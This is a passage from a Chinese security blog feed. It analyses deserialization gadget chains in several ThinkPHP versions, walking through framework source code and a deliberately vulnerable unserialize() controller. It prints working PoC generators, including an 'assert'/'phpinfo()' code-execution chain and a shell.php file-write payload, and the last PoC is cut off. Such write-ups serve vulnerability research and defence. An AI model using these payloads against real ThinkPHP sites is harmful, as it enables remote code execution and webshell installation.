variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Local</span>     <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$writeFlags</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//对应file_put_contents的第三个参数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Adapter<span class="token punctuation">\</span>Local</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">(</span><span class="token variable">$local</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.X反序列化利用链.md</a></p><p>2.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/</a></p><p>3.<a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-6-0-x反序列化/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;安装tp6.0&lt;/p&gt;
&lt;pre class=&quot; language-shell&quot;&gt;&lt;cod
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x反序列化链分析</title>
    <link href="http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-09T09:44:33.456Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>利用composer下载tp5.1.37的环境</p><pre class=" language-shell"><code class="language-shell">composer create-project --prefer-dist topthink/think thinkphp5.1.37cd thinkphp5.1.37修改composer.json文件里的为：topthink/framework": "5.1.37保存退出执行：composer update</code></pre><p>要进行反序列化攻击，需要可控的unserialize，在index控制器中写入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    </code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>这条链的前面部分跟tp5.0.24那条链一样，先全局查找__destruct魔术方法，找到文件<code>/thinkphp/library/think/process/pipes/Windows.php</code></p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles方法，file_exists函数执行会把里里面的参数当做字符串，所以可以调用__toString魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里，全局查找__toString，这里存在两条链，我们利用<code>\thinkphp\library\think\model\concern\Conversion.php</code>这条链来构造，这里要怎么调用到__toString方法，而Conversion类是trait关键字声明的，无法被实例化。在类中，可以使用use关键字来继承这个Conversion类，全局查找Conversion类，发现<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/1.png" alt="" loading="lazy"></p><p>抽象类不能被实例化，需要找他的子类，发现<code>\thinkphp\library\think\model\Pivot.php</code>，所以payload为：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>继续跟进__toString魔术方法中toJson-&gt;toArray()方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/2.png" alt="" loading="lazy"></p><p>当$relation可控的时候可以触发__call方法，这里，$this-&gt;append可控就代表key和name可控，跟进getRelation方法看一下</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/3.png" alt="" loading="lazy"></p><p>当条件语句都不满足无任何返回，就继续跟进getAttr方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/4.png" alt="" loading="lazy"></p><p>这里始终都会执行getData，跟进这个函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/5.png" alt="" loading="lazy"></p><p>$this-&gt;data可控，就代表$relation变量可控，所以就可以触发__call方法，全局查找一下。这里可以利用tprce那个那个类来触发命令执行。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/6.png" alt="" loading="lazy"></p><p>这里$this-&gt;hook[$method]是可控，而array_unshift函数会在$args数组前插入新元素，所以导致$args不可控，分析过tp5rce的都知道filterValue方法存在call_user_func可以构造rce。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/7.png" alt="" loading="lazy"></p><p>这里，怎么执行到filterValue，该类的input方法可以调用，但是input方法的参数不可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/8.png" alt="" loading="lazy"></p><p>需要查找哪里调用input方法了，发现param调用了input</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/9.png" alt="" loading="lazy"></p><p>这里$this-&gt;param可控，而name不可控，又需要查找哪里调用param方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isAjax</span><span class="token punctuation">(</span><span class="token variable">$ajax</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">server</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_REQUESTED_WITH'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token string">'xmlhttprequest'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token operator">===</span> <span class="token variable">$ajax</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$result</span>           <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string">'var_ajax'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mergeParam</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>找到isAjax方法，$this-&gt;config可控，就代表param方法中的name参数可控，就代表input方法中data，name参数都可控，继续回到input方法查看第1373行，在filterValue方法$filters参数要可控</p><pre class=" language-php"><code class="language-php"><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进getFilter方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/10.png" alt="" loading="lazy"></p><p>$this-&gt;filter可控就代表了filterValue方法$filters参数可控，所以组合起来，poc如下</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token string">"123456"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaa"</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$param</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"phpinfo()"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/5555/11.png" alt="" loading="lazy"></p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h4><p>不同版本生成的exp不同，如下是影响版本：</p><pre><code>5.1.3 &lt; tp &lt; 5.1.37</code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x反序列化</a></p><p>2.<a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p><p>3.<a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;利用composer下载tp5.1.37的环境&lt;/p&gt;
&lt;pre class=&quot; lang
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.24反序列化漏洞分析</title>
    <link href="http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-05-06T16:00:00.000Z</published>
    <updated>2020-05-07T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Index</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'Welcome to ThinkPHP!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="POP链构造分析"><a href="#POP链构造分析" class="headerlink" title="POP链构造分析"></a><strong>POP链构造分析</strong></h4><p>首先，进行全局搜索__destruct，查看thinkphp/library/think/process/pipes/Windows.php的Windows类中调用了__destruct魔术方法。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">removeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进removeFiles，发现file__exists函数，file__exists处理的时候会将当作字符串来处理，所以可以调用__toString，全局搜索__toString。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进toJson</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">toJson</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进toArray方法，这里发现三处可以触发__call方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/1.png" alt="" loading="lazy"></p><p>经过分析最后一处的参数可控，可以调用__call方法，要执行到这里，要满足如下条件：</p><p>$this-&gt;append可控且为数组，进入下面关键两行代码。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$modelRelation</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$relation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getRelationData</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$relation由$this-&gt;append控制，这里需要找个可控的点，在Model方法中getError方法可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进getRelationData方法，要满足if语句的条件就可以让value可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/2.png" alt="" loading="lazy"></p><p>通过全局搜索isSelfRelation，发现isSelfRelation方法是类Relation，而HasOne，OneToOne是Relation的子类，所以$modelRelation可以实例化HasOne类，继续都下面的代码，要满足：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$modelRelation</span><span class="token punctuation">,</span> <span class="token string">'getBindAttr'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>全局搜索getBindAttr，发现OneToOne中存在此方法，发现bindAttr可控</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBindAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>最后value可控，执行<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就可以调用到__call方法，全局查看__call，漏洞触发点在thinkphp/library/think/console/Output.php</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/3.png" alt="" loading="lazy"></p><p>跟进搜索block方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">block</span><span class="token punctuation">(</span><span class="token variable">$style</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeln</span><span class="token punctuation">(</span><span class="token string">"&lt;{$style}>{$message}&lt;/$style>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进writeln，在跟进write</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/4.png" alt="" loading="lazy"></p><p>这里发现$this-&gt;handle可控，可以进行全局搜索wirte方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/5.png" alt="" loading="lazy"></p><p>找到thinkphp/library/think/session/driver/Memcached.php文件中存在write方法，且$this-&gt;handle可控，继续全局查找set方法，在文件thinkphp/library/think/cache/driver/File.php发现存在写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/6.png" alt="" loading="lazy"></p><p>这里跟进getCacheKey方法，查看filename是否可控</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/7.png" alt="" loading="lazy"></p><p>这里$this-&gt;options可控，目前filename可控了，现在就只需要写入的data可控了，跟进setTagItem方法看一下，发现又执行了一次set。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/8.png" alt="" loading="lazy"></p><p>发现value的值就为传进来的filename。最后，整个的pop链就分析完了，贴上<a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">安全客的一篇文章</a></p><p>的pop链图。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/9.png" alt="" loading="lazy"></p><p>最后，poc如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Windows</span> <span class="token keyword">extends</span> <span class="token class-name">Pipes</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 